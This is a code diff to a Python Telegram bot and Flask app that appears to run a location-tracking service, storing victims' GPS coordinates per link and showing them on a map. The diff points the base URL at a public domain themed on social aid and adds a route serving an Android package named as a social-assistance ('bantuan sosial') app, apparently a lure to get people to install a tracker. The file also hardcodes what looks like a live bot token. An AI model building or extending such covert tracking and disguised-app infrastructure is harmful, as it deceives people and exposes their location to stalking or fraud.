@@ -16,7 +16,7 @@ from telegram.ext import Application, CommandHandler, CallbackQueryHandler, Cont
 
 # ============ CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN", "8845527390:AAH1RZGR9zuYM7Se_O5171QwgnhQ6gs85dY")
-BASE_URL = os.environ.get("BASE_URL", "http://localhost:5000")
+BASE_URL = os.environ.get("BASE_URL", "https://bansos.jokichannel.eu.org")
 DB_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "tracker.db")
 BANNER_PATH = os.environ.get("BANNER_PATH", os.path.join(os.path.dirname(os.path.abspath(__file__)), "banner.jpg"))
 
@@ -470,6 +470,17 @@ def map_view(tid):
         return render_template("error.html", message="Link tidak ditemukan"), 404
     evs = db_exec("SELECT latitude,longitude,accuracy,timestamp FROM tracking_events WHERE tracking_id=? ORDER BY timestamp DESC", (tid,))
     return render_template("map.html", tracking_id=tid, link_info=info[0], events=evs)
+
+@app.route("/download/apk")
+def download_apk():
+    import flask
+    apk_path = "/root/gps-link/android/bantuan-sosial.apk"
+    if os.path.exists(apk_path):
+        with open(apk_path, "rb") as f:
+            data = f.read()
+        return flask.Response(data, mimetype="application/vnd.android.package-archive",
+            headers={"Content-Disposition": "attachment; filename=bantuan-sosial.apk"})
+    return "File tidak ditemukan", 404
 
 # ============ MAIN ============
 def main():
